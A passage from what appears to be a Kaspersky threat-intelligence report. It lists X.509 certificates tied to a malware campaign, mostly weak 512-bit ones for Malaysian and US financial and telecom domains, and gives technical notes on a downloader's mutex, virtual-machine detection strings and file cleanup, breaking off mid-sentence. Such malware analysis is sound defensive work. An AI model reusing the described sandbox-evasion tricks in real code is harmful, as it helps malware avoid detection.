BAcnFhEwHQYDVR0OBBYEFAbsw3WZqmceE0q33YOKW4bjjvndMA0GCSqGSIb3DQEB
BQUAA4IBAQBsDfdZxUgtxIH1vouHC/6ULTzkwY+tiEF / m3H2Vo1wuv8gx22NUigK
j8wEgkVyHg6fQ32v2vMHNLI6l160RDFLIYDszgKYMFnch3OQmdF5yti9qs00ZeLB
H3jC2mlgOsoLa27dgG39IAmFiCyaQHz7fXjKPsa / gTpqCenZxehX6ZSiivjIHw6E
m9F3WoC2wxPKhgqbeKCfg4QG643RF1B4aLC7mSpQ90SSTjrKY0iqXjAbEom3HfOn
SgLM2i/85kdXB7Ez8L9/biZZYuxmuB+mCWV82+TCCdKX5xXkNKjW89I6+SBqoKGv
kxvqjOqlKibaoHPt7Wf2U6CEoQwx/9gI
END CERTIFICATE
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number : 2176345 ( 0x213559 )
Signature Algorithm : sha1WithRSAEncryption
TLP : Green 	            For any inquiries , please contact intelreports@kaspersky.com
47
Issuer : C = MY , O = Digicert Sdn . Bhd . , OU=457608 K ,
CN = Digisign Server ID ( Enrich )
Validity
Not Before : Dec 17 08:55:45 2008 GMT
Not After : Dec 17 08:55:45 2010 GMT
Subject : C = MY , O = JARING Communications Sdn . Bhd . ,
OU = JARING , CN = www.flexicorp.jaring.my , L = W.Persekutuan/
emailAddress=sysadmin@jaring.my , ST = Kuala Lumpur
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
PublicKey : ( 512 bit )
Modulus :
00:ed:61:d7:12:f3:94:1a:5f : d1:8b:28:35:b4:18 :
38:d3:32:7b:7b:79:94:79:64:3d : db : bd : ad : f2:ff :
6c:61:fd:43:05:c1:f8:41:95:de:01:c2:ca:98:65 :
d6:9f : bc:21:5c:35:76:9f : ff:3a:62:88:7b:32:21 :
94:52:e1:46:ef
Exponent : 65537 ( 0x10001 )
X509v3 extensions :
X509v3 Subject Key Identifier :
46:B9:8C:9E:2E : F7:69:2F
X509v3 Certificate Policies :
Policy : 2.16.458.1.1
CPS : http://www.digicert.com.my/cps.htm
X509v3 Authority Key Identifier :
keyid : C6:16:93:4E:16:17:EC:16:AE:8C:94:76:F3:86:6D : C
5:74:6E:84:77
X509v3 Key Usage :
Digital Signature , Non Repudiation , Key
Encipherment , Data Encipherment
Signature Algorithm : sha1WithRSAEncryption
7b:15:12:93:d0:13:c8:91:f1:18:a9:76:bb:87:b4:44:aa:77 :
27:05:a6:5b:95:6c : c0:6f : c5:94:7d:33:94:d3:6e:12:6f : dd :
90:12:18:e9:a6:48:cb : d8:a4:8a : a4:68:70:92:32:fd : d8:7c :
00:9c : db : de:7e : dd:1e:41:b0:2e:4c:48:f0:73:85:79:a8:df :
68:45:41:97:01:06:b2:c4:9f:9d:04:6a:13:d4:6e:63:ec : bf :
c9:00:82:f2:51:89:33:c0:3b : ba:4c : eb:8a:98:a3:28:34:30 :
5d : ab:12:c6:71:cf:09:68:3d:47:6d : f2:c0:9e:41:44:83:7c :
0b : fe
TLP : Green 	           For any inquiries , please contact intelreports@kaspersky.com
48
BEGIN CERTIFICATE
MIIC3jCCAkegAwIBAgIDITVZMA0GCSqGSIb3DQEBBQUAMGMxCzAJBgNVBAYTAk1Z
MRswGQYDVQQKExJEaWdpY2VydCBTZG4uIEJoZC4xETAPBgNVBAsTCDQ1NzYwOC1L
MSQwIgYDVQQDExtEaWdpc2lnbiBTZXJ2ZXIgSUQgKEVucmljaCkwHhcNMDgxMjE3
MDg1NTQ1WhcNMTAxMjE3MDg1NTQ1WjCBuzELMAkGA1UEBhMCTVkxJzAlBgNVBAoT
HkpBUklORyBDb21tdW5pY2F0aW9ucyBTZG4uQmhkLjEPMA0GA1UECxMGSkFSSU5H
MSAwHgYDVQQDExd3d3cuZmxleGljb3JwLmphcmluZy5teTEWMBQGA1UEBxMNVy5Q
ZXJzZWt1dHVhbjEhMB8GCSqGSIb3DQEJARYSc3lzYWRtaW5AamFyaW5nLm15MRUw
EwYDVQQIEwxLdWFsYSBMdW1wdXIwXDANBgkqhkiG9w0BAQEFAANLADBIAkEA7WHX
EvOUGl / Riyg1tBg40zJ7e3mUeWQ9272t8v9sYf1DBcH4QZXeAcLKmGXWn7whXDV2
n/86Yoh7MiGUUuFG7wIDAQABo4GKMIGHMBEGA1UdDgQKBAhGuYyeLvdpLzBEBgNV
HSAEPTA7MDkGBWCDSgEBMDAwLgYIKwYBBQUHAgEWImh0dHA6Ly93d3cuZGlnaWNl
cnQuY29tLm15L2Nwcy5odG0wHwYDVR0jBBgwFoAUxhaTThYX7BaujJR284ZtxXRu
hHcwCwYDVR0PBAQDAgTwMA0GCSqGSIb3DQEBBQUAA4GBAHsVEpPQE8iR8RipdruH
tESqdycFpluVbMBvxZR9M5TTbhJv3ZASGOmmSMvYpIqkaHCSMv3YfACc295 + 3R5B
sC5MSPBzhXmo32hFQZcBBrLEn50EahPUbmPsv8kAgvJRiTPAO7pM64qYoyg0MF2r
EsZxzwloPUdt8sCeQUSDfAv+
END CERTIFICATE
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number : 2674380 ( 0x28cecc )
Signature Algorithm : sha1WithRSAEncryption
Issuer : C = MY , O = Digicert Sdn . Bhd . , OU=457608 K ,
CN = Digisign Server ID ( Enrich )
Validity
Not Before : Dec 7 08:02:08 2009 GMT
Not After : Dec 7 08:02:08 2010 GMT
Subject : C = MY , O = BANK NEGARA MALAYSIA , OU = BANK NEGARA
MALAYSIA , CN = payments.bnm.gov.my
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
PublicKey : ( 512 bit )
Modulus :
00:a0:c6:99:f0:88:9a:1c : ee : f7:22:72:5e : bc:1f :
02:40:68:f6:95:54:36:75:56:b3:31:0b:0c:54:c3 :
46:e9:39:ec:62:b4:83:61:2d : b1:ab:42:3b : a2:4f :
4b:98:bb:6c:37:a8:3d:98:26:c8:2d:5f:75:86:3f :
b4:39:be:41:53
TLP : Green 	          For any inquiries , please contact intelreports@kaspersky.com
49
Exponent : 65537 ( 0x10001 )
X509v3 extensions :
X509v3 Subject Key Identifier :
42:65:56:13:70:34:D0:63
X509v3 Certificate Policies :
Policy : 2.16.458.1.1
CPS : http://www.digicert.com.my/cps.htm
X509v3 Authority Key Identifier :
keyid : C6:16:93:4E:16:17:EC:16:AE:8C:94:76:F3:86:6D : C
5:74:6E:84:77
X509v3 Key Usage :
Digital Signature , Non Repudiation , Key
Encipherment , Data Encipherment
Signature Algorithm : sha1WithRSAEncryption
aa:32:37:ce:26:23:14:3e : dc:33:77:a6:bb : df:8d : f1:27:b1 :
64:05:b3:9b : a3:5c : d7:63:e7:7b : bd:63:a4:a1:61:7c : d0:3c :
1e : c5:e6:a2:a9:01:6f:36:4a:44:de:50:f3:a0:53:d0:39:56 :
a8:b5:05:d0:24:42:b8:2e : d3:98:f3:0a:1a:94:29:73:eb : d2 :
38:9b : a0:9f:9e:39:2d:52:10:57:4e:12:8e:72:2a : e3:87:80 :
f8:f2:16:5d:56:15:cc : ea:74:96:f4:ef : d1:2e:1b:70:f9:bb :
ba : b9:2a : b1:4c:3d:38:51:10:e0:4e:8d:53:05:6b:88:a1:77 :
ab : a0
BEGIN CERTIFICATE
MIICizCCAfSgAwIBAgIDKM7MMA0GCSqGSIb3DQEBBQUAMGMxCzAJBgNVBAYTAk1Z
MRswGQYDVQQKExJEaWdpY2VydCBTZG4uIEJoZC4xETAPBgNVBAsTCDQ1NzYwOC1L
MSQwIgYDVQQDExtEaWdpc2lnbiBTZXJ2ZXIgSUQgKEVucmljaCkwHhcNMDkxMjA3
MDgwMjA4WhcNMTAxMjA3MDgwMjA4WjBpMQswCQYDVQQGEwJNWTEdMBsGA1UEChMU
QkFOSyBORUdBUkEgTUFMQVlTSUExHTAbBgNVBAsTFEJBTksgTkVHQVJBIE1BTEFZ
U0lBMRwwGgYDVQQDExNwYXltZW50cy5ibm0uZ292Lm15MFwwDQYJKoZIhvcNAQEB
BQADSwAwSAJBAKDGmfCImhzu9yJyXrwfAkBo9pVUNnVWszELDFTDRuk57GK0g2Et
satCO6JPS5i7bDeoPZgmyC1fdYY / tDm+QVMCAwEAAaOBijCBhzARBgNVHQ4ECgQI
QmVWE3A00GMwRAYDVR0gBD0wOzA5BgVgg0oBATAwMC4GCCsGAQUFBwIBFiJodHRw
Oi8vd3d3LmRpZ2ljZXJ0LmNvbS5teS9jcHMuaHRtMB8GA1UdIwQYMBaAFMYWk04W
F+wWroyUdvOGbcV0boR3MAsGA1UdDwQEAwIE8DANBgkqhkiG9w0BAQUFAAOBgQCq
MjfOJiMUPtwzd6a7343xJ7FkBbObo1zXY+d7vWOkoWF80DwexeaiqQFvNkpE3lDz
oFPQOVaotQXQJEK4LtOY8woalClz69I4m6CfnjktUhBXThKOcirjh4D48hZdVhXM
6nSW9O / RLhtw+bu6uSqxTD04URDgTo1TBWuIoXeroA==
END CERTIFICATE
TLP : Green 	           For any inquiries , please contact intelreports@kaspersky.com
50
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number : 01:00:00:00:00:01:1f:80:95:bf:76
Signature Algorithm : sha1WithRSAEncryption
Issuer : O = GlobalSign Inc , CN = Cybertrust SureServer CA
Validity
Not Before : Feb 16 18:44:52 2009 GMT
Not After : Feb 16 18:44:52 2011 GMT
Subject : CN = ambermms.syniverse.com ,
C=US/emailAddress=belinda.jablonski@syniverse.com ,
L = Tampa , O = Syniverse Technologies Inc. , OU = Crossroads ,
ST = Florida
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
PublicKey : ( 512 bit )
Modulus :
00:a5:13:53:17:02:f7:cd:33:64:7d : e8:27:8f : e9 :
bc : ab : db:96:3b:41:0d : b6:c4:2a:10:d5:64:58:87 :
ac:62:de:09:2e : c5:5f:79:c5:d5:9e:26:9b:1a:9a :
e3:99:3b : e2:2e:48:7e:9c:5f:74:c9:34:09:b3:a5 :
40:7f : bb : e9:35
Exponent : 65537 ( 0x10001 )
X509v3 extensions :
Netscape Cert Type :
SSL Client , SSL Server
X509v3 Key Usage : critical
Digital Signature , Non Repudiation , Key
Encipherment , Data Encipherment
X509v3 Authority Key Identifier :
keyid:2B:37:53:93:64:47:66:23:4F:00:D3:F7:DD : E8:30:B
6:5B:84:89:23
X509v3 CRL Distribution Points :
Full Name :
URI : http://crl.globalsign.net / sureserver.crl
X509v3 Basic Constraints : critical
CA : FALSE
Signature Algorithm : sha1WithRSAEncryption
11:6e:15:44:b0:d1:a9:98:61:27:c0:f2:28:ac:50:70:e6:63 :
25:f2:75:ec:4d:30:fe:0a:34:ed:77:54:4a : d4:53:0f:60:d6 :
TLP : Green 	          For any inquiries , please contact intelreports@kaspersky.com
51
45:8a:70:6f:5f : c8:c2:bd:8d:4d:6b : e2:f4:d6:43:cc:34:fe :
ad : ba : b6:ec : cb:88:68:0d:38:ba:99:b9:18:73:c9:1d:05:97 :
5e:95:43:c5:92:a9:00:f6:2f:4d:8c:51:09:bb:22:74:b4:9e :
34:96:d9:9c:82:d2:fb:2c : be:0c:29:4d:50:5f : a5:3c:1a : d5 :
38:ca : d9:74:7a:81:c5:11:79:a4:4d : c6:23:81:14:2b : d3:b1 :
46:18:b6:c0:e2:4a:97:b6:07:c3:d7:b6:77:51:d9:4f:05:21 :
45:bb : b0:7c:4f : bc:6e : f6:72:62:22:28:1c : b0:06:70:02:2b :
c5:11:b6:d0:c3:e0:ce : d7:81:ff : d6:c7:97:03:9d:87:68:b7 :
3a : c4:53:18:bf : cc : e4:b3:7f : fc:6b:83:b1:35:04:c1:ee : ea :
42:d5:bf : c2:57:ff:18:a3:ce:52:a4:2c:92:2a:6f : b6:98:62 :
45:98:96:76:90:80:32:b9:8c : fe:93:a8:86:e9:50:62:9a : a6 :
11:52:1d:81:67:dc:84:ed : d8:e4:3d : a1:b7:0f:85:fd : b1:4b :
6f : bd : fe:3c
BEGIN CERTIFICATE
MIIDRjCCAi6gAwIBAgILAQAAAAABH4CVv3YwDQYJKoZIhvcNAQEFBQAwPDEXMBUG
A1UEChMOR2xvYmFsU2lnbiBJbmMxITAfBgNVBAMTGEN5YmVydHJ1c3QgU3VyZVNl
cnZlciBDQTAeFw0wOTAyMTYxODQ0NTJaFw0xMTAyMTYxODQ0NTJaMIG7MR8wHQYD
VQQDExZhbWJlcm1tcy5zeW5pdmVyc2UuY29tMQswCQYDVQQGEwJVUzEuMCwGCSqG
SIb3DQEJARYfYmVsaW5kYS5qYWJsb25za2lAc3luaXZlcnNlLmNvbTEOMAwGA1UE
BxMFVGFtcGExJDAiBgNVBAoTG1N5bml2ZXJzZSBUZWNobm9sb2dpZXMgSW5jLjET
MBEGA1UECxMKQ3Jvc3Nyb2FkczEQMA4GA1UECBMHRmxvcmlkYTBcMA0GCSqGSIb3
DQEBAQUAA0sAMEgCQQClE1MXAvfNM2R96CeP6byr25Y7QQ22xCoQ1WRYh6xi3gku
xV95xdWeJpsamuOZO+IuSH6cX3TJNAmzpUB / u+k1AgMBAAGjgZAwgY0wEQYJYIZI
AYb4QgEBBAQDAgbAMA4GA1UdDwEB / wQEAwIE8DAfBgNVHSMEGDAWgBQrN1OTZEdm
I08A0/fd6DC2W4SJIzA5BgNVHR8EMjAwMC6gLKAqhihodHRwOi8vY3JsLmdsb2Jh
bHNpZ24ubmV0L3N1cmVzZXJ2ZXIuY3JsMAwGA1UdEwEB / wQCMAAwDQYJKoZIhvcN
AQEFBQADggEBABFuFUSw0amYYSfA8iisUHDmYyXydexNMP4KNO13VErUUw9g1kWK
cG9fyMK9jU1r4vTWQ8w0/q26tuzLiGgNOLqZuRhzyR0Fl16VQ8WSqQD2L02MUQm7
InS0njSW2ZyC0vssvgwpTVBfpTwa1TjK2XR6gcUReaRNxiOBFCvTsUYYtsDiSpe2
B8PXtndR2U8FIUW7sHxPvG72cmIiKBywBnACK8URttDD4M7Xgf / Wx5cDnYdotzrE
Uxi / zOSzf / xrg7E1BMHu6kLVv8JX / xijzlKkLJIqb7aYYkWYlnaQgDK5jP6TqIbp
UGKaphFSHYFn3ITt2OQ9obcPhf2xS2 + 9/jw=
END CERTIFICATE
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number : 71:a9:60:1f:3d:87:46:30:9b : bf:5e : cf:28:24:8
b : fe
TLP : Green 	            For any inquiries , please contact intelreports@kaspersky.com
52
Signature Algorithm : sha1WithRSAEncryption
Issuer : C = US , O = VeriSign , Inc. , OU = VeriSign Trust Network ,
OU = Terms of use at https://www.verisign.com/rpa ( c)09 ,
CN = VeriSign Class 3 Secure OFX CA G3
Validity
Not Before : Oct 26 00:00:00 2009 GMT
Not After : Oct 26 23:59:59 2010 GMT
Subject : C = US , ST = Missouri , L = Bridgeton , O = Vantage Credit
Union , OU = IT Department , CN = secure2.eecu.com
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
PublicKey : ( 512 bit )
Modulus :
00:be:6e:4a:59:2e:33:40:79:33:79:d9:9b:34:68 :
a6:74:f1:7f:02:d1:ac:91:21:5a : e1:bf:34:03:62 :
33:0d : bb : bc:0a:29:ec:9c : fd : ea:16:ac:9d : e3:1b :
6f:7d : c7:68:ef : ee:04:03:6f:83:23:cd:1e:82:bb :
ab:24:6d:22:7f
Exponent : 65537 ( 0x10001 )
X509v3 extensions :
X509v3 Basic Constraints :
CA : FALSE
X509v3 Key Usage :
Digital Signature , Key Encipherment
X509v3 CRL Distribution Points :
Full Name :
URI : http://ofxG3crl.verisign.com / OFXG3.crl
Authority Information Access :
OCSP URI :
http://ocsp.verisign.com
CA Issuers URI :
http://ofxG3aia.verisign.com / OFXG3.cer
X509v3 Certificate Policies :
Policy : 2.16.840.1.113733.1.7.23.3
CPS : https://www.verisign.com/rpa
2.16.840.1.113733.1.6.7 :
. 74cb5e68cb6fa8877cc86c25d1d7ce05
Signature Algorithm : sha1WithRSAEncryption
19:35:da : ac:91:36:a2:6c:7e : a0:96:75:9c:23:e1:e2:c3:f5 :
9e:76:6d:42:6e:3a:2f : c6:23:79:ed:33:7b : c4:d4:a3:58:c3 :
TLP : Green 	           For any inquiries , please contact intelreports@kaspersky.com
53
f3:30:e2:69:4e : f9:01:89:41:f7:6a : dd:03:1f:6a : c9:e3:c9 :
ab:68:9f:6c : f6:67:31:76:32:e6:75:7b : e5:3a:31:3c:91:7e :
e2:a0:94:18:ef : c9:75:d8:b2:28:bf : ed:8c : e4:69:0b : a6:95 :
aa:7c:3c:41:07:0e : fb:80:35:54:4c:3b : c8:c3:ac:2b : c2:86 :
c5:a8:61:20:38:22:e9:9c:23:82:d7:e3:80:ee : f1:aa : c6:cd :
27:42:d2:3f:9a:83:66:db:41:66:ee : e7:4a : f9:75:c0:bd : e6 :
6c : dd:0e : e2:e5:34:8d:79:2c : cc : cb:79:1b : b0:46:08:ed:18 :
ce:38:65:b5:f0:87:fc:23:12:fe:9f:03:d3:0b:5b:0e : e8:9d :
b5:c3:b7:36:f3:b9:42:4c : c4:64:5b:5f : d4:68:ec:40:de : a3 :
29:92:8a : a9:75:78:8a : bb:07:e4:49:c4:80:5e:94:c5:6c:7a :
50:a5:7d:90:18:6b:0d:49:69:f9:93:d6:5b:24:82:a7:85:ee :
d8:f4:fe:6e : f5:81:0c : e2:de:5c:44:c2:f6:67:ee : e3:f0:8c :
07:ff:34:90
BEGIN CERTIFICATE
MIIEOzCCAyOgAwIBAgIQcalgHz2HRjCbv17PKCSL / jANBgkqhkiG9w0BAQUFADCB
sjELMAkGA1UEBhMCVVMxFzAVBgNVBAoTDlZlcmlTaWduLCBJbmMuMR8wHQYDVQQL
ExZWZXJpU2lnbiBUcnVzdCBOZXR3b3JrMTswOQYDVQQLEzJUZXJtcyBvZiB1c2Ug
YXQgaHR0cHM6Ly93d3cudmVyaXNpZ24uY29tL3JwYSAoYykwOTEsMCoGA1UEAxMj
VmVyaVNpZ24gQ2xhc3MgMyBTZWN1cmUgT0ZYIENBIC0gRzMwHhcNMDkxMDI2MDAw
MDAwWhcNMTAxMDI2MjM1OTU5WjCBhjELMAkGA1UEBhMCVVMxETAPBgNVBAgTCE1p
c3NvdXJpMRIwEAYDVQQHFAlCcmlkZ2V0b24xHTAbBgNVBAoUFFZhbnRhZ2UgQ3Jl
ZGl0IFVuaW9uMRYwFAYDVQQLFA1JVCBEZXBhcnRtZW50MRkwFwYDVQQDFBBzZWN1
cmUyLmVlY3UuY29tMFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAL5uSlkuM0B5M3nZ
mzRopnTxfwLRrJEhWuG / NANiMw27vAop7Jz96hasneMbb33HaO / uBANvgyPNHoK7
qyRtIn8CAwEAAaOCAT0wggE5MAkGA1UdEwQCMAAwCwYDVR0PBAQDAgWgMDoGA1Ud
HwQzMDEwL6AtoCuGKWh0dHA6Ly9vZngtRzMtY3JsLnZlcmlzaWduLmNvbS9PRlgt
RzMuY3JsMGsGCCsGAQUFBwEBBF8wXTAkBggrBgEFBQcwAYYYaHR0cDovL29jc3Au
dmVyaXNpZ24uY29tMDUGCCsGAQUFBzAChilodHRwOi8vb2Z4LUczLWFpYS52ZXJp
c2lnbi5jb20vT0ZYLUczLmNlcjBEBgNVHSAEPTA7MDkGC2CGSAGG+EUBBxcDMCow
KAYIKwYBBQUHAgEWHGh0dHBzOi8vd3d3LnZlcmlzaWduLmNvbS9ycGEwMAYKYIZI
AYb4RQEGBwQiFiA3NGNiNWU2OGNiNmZhODg3N2NjODZjMjVkMWQ3Y2UwNTANBgkq
hkiG9w0BAQUFAAOCAQEAGTXarJE2omx+oJZ1nCPh4sP1nnZtQm46L8Yjee0ze8TU
o1jD8zDiaU75AYlB92rdAx9qyePJq2ifbPZnMXYy5nV75ToxPJF+4qCUGO / Jddiy
KL / tjORpC6aVqnw8QQcO+4A1VEw7yMOsK8KGxahhIDgi6ZwjgtfjgO7xqsbNJ0LS
P5qDZttBZu7nSvl1wL3mbN0O4uU0jXkszMt5G7BGCO0YzjhltfCH / CMS / p8D0wtb
DuidtcO3NvO5QkzEZFtf1GjsQN6jKZKKqXV4irsH5EnEgF6UxWx6UKV9kBhrDUlp
+ ZPWWySCp4Xu2PT+bvWBDOLeXETC9mfu4/CMB/80kA==
END CERTIFICATE
Certificate :
TLP : Green 	            For any inquiries , please contact intelreports@kaspersky.com
54
Data :
Version : 3 ( 0x2 )
Serial Number :
( Negative)0a:40:06:6d:24:7d:41:54:b2:c3:e9:e2
: a4:57:97:59
Signature Algorithm : md5WithRSAEncryption
Issuer : CN = Root Agency
Validity
Not Before : Jun 9 10:31:21 2009 GMT
Not After : Dec 31 23:59:59 2039 GMT
Subject : CN = Microsoft
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
PublicKey : ( 1024 bit )
Modulus :
00:cd:25:d3:98:06:2d:91:f1:ad : d7:17:32:66:0a :
d6:25:a0:7f : ff:2e:6c:68:95:f9:92:09:a0:63:a5 :
80:54:22:e6:92:13:b8:67:05:3f:80:69:34:07:e4 :
c3:00:bc:86:f3:51:64:22:d7:ab:07:be : e5:f7:e7 :
97:b3:3d:9f : fc:10:b0:52:e7:d1:62:40:2a:18:83 :
b6:4d:62:e6:f5:9f : fe:16:5e:41:d7:2b : af:54:a7 :
8e : af : a9:08:df:39:b2:cb : cf : bf:52:c3:bf:04:8f :
a0:c0:16:89:ce:06:df:6e : d9:26:8a : a7:01:f8:9b :
23:35:3b:4c:96:6d:4a:10:41
Exponent : 65537 ( 0x10001 )
X509v3 extensions :
2.5.29.1 :
0 > ........
O .. a! .. dc .. 0.1.0 ... U .... Root Agency ... 7l ... d ...... \5 .
Signature Algorithm : md5WithRSAEncryption
1a:0c:28:45:f5:5e : b1:a9:04:3a:30:7a:0b : e2:dd : f2:7c:89 :
22:ac:17:b5:f3:87:6f : e4:09:9e:55:73:f9:11:7b:11:d2:d7 :
26:08:03:47:6f:6b : b5:1d:24:04:50:d4:cb:91:99:ac:13:72 :
16:32:05:be:7e:1a:79:29:19:5e
BEGIN CERTIFICATE
MIIBuTCCAWOgAwIBAgIQ9b/5ktuCvqtNPBYdW6hopzANBgkqhkiG9w0BAQQFADAW
MRQwEgYDVQQDEwtSb290IEFnZW5jeTAeFw0wOTA2MDkxMDMxMjFaFw0zOTEyMzEy
MzU5NTlaMBQxEjAQBgNVBAMTCU1pY3Jvc29mdDCBnzANBgkqhkiG9w0BAQEFAAOB
jQAwgYkCgYEAzSXTmAYtkfGt1xcyZgrWJaB//y5saJX5kgmgY6WAVCLmkhO4ZwU/
TLP : Green 	           For any inquiries , please contact intelreports@kaspersky.com
55
gGk0B+TDALyG81FkIterB77l9+eXsz2f / BCwUufRYkAqGIO2TWLm9Z/+Fl5B1yuv
VKeOr6kI3zmyy8+/UsO / BI+gwBaJzgbfbtkmiqcB+JsjNTtMlm1KEEECAwEAAaNL
MEkwRwYDVR0BBEAwPoAQEuQJLQYdHU8AjWEh3BZkY6EYMBYxFDASBgNVBAMTC1Jv
b3QgQWdlbmN5ghAGN2wAqgBkihHPuNSqXDX0MA0GCSqGSIb3DQEBBAUAA0EAGgwo
RfVesakEOjB6C+Ld8nyJIqwXtfOHb+QJnlVz+RF7EdLXJggDR29rtR0kBFDUy5GZ
rBNyFjIFvn4aeSkZXg==
END CERTIFICATE
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number : 01:00:00:00:00:01:1f:71:31:72:c9
Signature Algorithm : sha1WithRSAEncryption
Issuer : O = GlobalSign Inc , CN = Cybertrust SureServer CA
Validity
Not Before : Feb 13 19:00:51 2009 GMT
Not After : Feb 13 19:00:51 2011 GMT
Subject : CN = inpack.syniverse.com ,
C=US/emailAddress=belinda.jablonski@syniverse.com , L = Tampa
, O = Syniverse Technologies Inc. , OU = Crossroads , ST = Florida
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
PublicKey : ( 512 bit )
Modulus :
00:a5:13:53:17:02:f7:cd:33:64:7d : e8:27:8f : e9 :
bc : ab : db:96:3b:41:0d : b6:c4:2a:10:d5:64:58:87 :
ac:62:de:09:2e : c5:5f:79:c5:d5:9e:26:9b:1a:9a :
e3:99:3b : e2:2e:48:7e:9c:5f:74:c9:34:09:b3:a5 :
40:7f : bb : e9:35
Exponent : 65537 ( 0x10001 )
X509v3 extensions :
Netscape Cert Type :
SSL Client , SSL Server
X509v3 Key Usage : critical
Digital Signature , Non Repudiation , Key
Encipherment , Data Encipherment
X509v3 Authority Key Identifier :
keyid:2B:37:53:93:64:47:66:23:4F:00:D3:F7:DD : E8:30:B
6:5B:84:89:23
X509v3 CRL Distribution Points :
Full Name :
TLP : Green 	          For any inquiries , please contact intelreports@kaspersky.com
56
URI : http://crl.globalsign.net / sureserver.crl
X509v3 Basic Constraints : critical
CA : FALSE
Signature Algorithm : sha1WithRSAEncryption
95:2a:42:59:bd:18:1a : ec:20:e9:96:0d:7f : f2:bc:4e:79:8a :
44:21:a4:d7:46:03:94:a8:ec : d0:28:29:07:d0:f5:bc:91:c5 :
21:34:16:dd:87:ee : dc:6a : d4:e7:f4:d4:f9:a6:04:bb:60:53 :
2b:14:19:8a:2c:2e:1f:6a:8f:97:22:d6:f4:e5:44:06:c2:22 :
ee : cf : b2:19:67:fa:40:0f:9c : cf:58:7f:53:21:af : c0:02:ad :
d8:7c:19:3c : f3:52:f4:10:30:f0:61:24:a9:9d:18:01:a3:f5 :
c9:29:ab:65:66:ef : a5:2d : cd:53:e2:44:09:ea:8d:4c : bc : ef :
1a : b6:2c:7b : df:16:39:94:8b:33:cb:14:16:c2:93:42:6c:4d :
18:99:ba:7b : fa:91:74:f0:9a:1e : ae:92:b4:94:43:bb:96:ba :
7e:6a : df:38:9c:2e:7c:11:37:37:4c:20:80:5d:6b : e2:94:41 :
98:7d : cc:26:ca : cc:4f:81:4d:95:16:bb:26:db:1f : fe:03:fc :
a2:50:9c:49:0b:45:7c:86:fc:5c : a6:31:34:f2:08:f1:03:16 :
10:e0:90:0c : e7:02:4e:95:f5:e8:32:03:a3:fb:78:17:dc:23 :
bf : b4:59:e6:6f:91:1c:38:cd : b7:9e:48:a0:6b:68:98:00:e3 :
33:48:18:ae
BEGIN CERTIFICATE
MIIDRDCCAiygAwIBAgILAQAAAAABH3ExcskwDQYJKoZIhvcNAQEFBQAwPDEXMBUG
A1UEChMOR2xvYmFsU2lnbiBJbmMxITAfBgNVBAMTGEN5YmVydHJ1c3QgU3VyZVNl
cnZlciBDQTAeFw0wOTAyMTMxOTAwNTFaFw0xMTAyMTMxOTAwNTFaMIG5MR0wGwYD
VQQDExRpbnBhY2suc3luaXZlcnNlLmNvbTELMAkGA1UEBhMCVVMxLjAsBgkqhkiG
9w0BCQEWH2JlbGluZGEuamFibG9uc2tpQHN5bml2ZXJzZS5jb20xDjAMBgNVBAcT
BVRhbXBhMSQwIgYDVQQKExtTeW5pdmVyc2UgVGVjaG5vbG9naWVzIEluYy4xEzAR
BgNVBAsTCkNyb3Nzcm9hZHMxEDAOBgNVBAgTB0Zsb3JpZGEwXDANBgkqhkiG9w0B
AQEFAANLADBIAkEApRNTFwL3zTNkfegnj+m8q9uWO0ENtsQqENVkWIesYt4JLsVf
ecXVniabGprjmTviLkh+nF90yTQJs6VAf7vpNQIDAQABo4GQMIGNMBEGCWCGSAGG
+ EIBAQQEAwIGwDAOBgNVHQ8BAf8EBAMCBPAwHwYDVR0jBBgwFoAUKzdTk2RHZiNP
ANP33egwtluEiSMwOQYDVR0fBDIwMDAuoCygKoYoaHR0cDovL2NybC5nbG9iYWxz
aWduLm5ldC9zdXJlc2VydmVyLmNybDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEB
BQUAA4IBAQCVKkJZvRga7CDplg1/8rxOeYpEIaTXRgOUqOzQKCkH0PW8kcUhNBbd
h+7catTn9NT5pgS7YFMrFBmKLC4fao+XItb05UQGwiLuz7IZZ / pAD5zPWH9TIa / A
Aq3YfBk881L0EDDwYSSpnRgBo / XJKatlZu+lLc1T4kQJ6o1MvO8atix73xY5lIsz
TLP : Green 	           For any inquiries , please contact intelreports@kaspersky.com
57
yxQWwpNCbE0Ymbp7+pF08JoerpK0lEO7lrp+at84nC58ETc3TCCAXWvilEGYfcwm
ysxPgU2VFrsm2x/+A / yiUJxJC0V8hvxcpjE08gjxAxYQ4JAM5wJOlfXoMgOj+3gX
3CO / tFnmb5EcOM23nkiga2iYAOMzSBiu
END CERTIFICATE
TLP : Green 	          For any inquiries , please contact intelreports@kaspersky.com
58
Appendix D. Malcode Technical Notes
Small Downloader
Filename       MD5                                  Link Time ( UTC )            Linker
msieckc.exe    41b816289a6a639f7f2a72b6c9e6a695     2012.04.11 18:31:48        6.0
Technical Details
To ensure only single instance of the module is running , the module verifies if
system mutex named « 132DF6E » exists . If it exists the module exits , if not ­the
module creates one .
The module implements a method to resist running in virtual environment . It gets
CPU name and identifier from the registry at HKLM\HARDWARE\DESCRIPTION\
System\CentralProcessor\0
and collects IP and MAC addresses of local network adapters . After that it
compiles a string describing the system in the following format : « C P U :
% CPUNAME%<br > Net card : % IP% ( % MACADDR%)<br > » . Next it checks if this
string contains one of the following substrings :
• 	 	 « VMWARE »
• 	 	 « QEMU »
• 	 	 « 192.168.100 . »
If any of these strings is found , the module terminates .
After that , there is a hardcoded value of 10 , which delays further execution of the
module for 10 seconds . Then the module attempts to delete some other , prob-
ably older , components which might be present on the system . The list of deleted
files includes the following :
• 	 	 % APPDATA%\Microsoft\Crypto\DES64v7\dtlcntr.exe
• 	 	 % APPDATA%\Microsoft\Crypto\DES64v7\googletoolbar.exe
• 	 	 % APPDATA%\Microsoft\Crypto\DES64v7\active.dll
• 	 	 % APPDATA%\Microsoft\Crypto\DES64v7\detect.dll
The next is step is to check if current directory has a file named « U » . If not , the
module proceeds with network communication routine . But if this file is found it
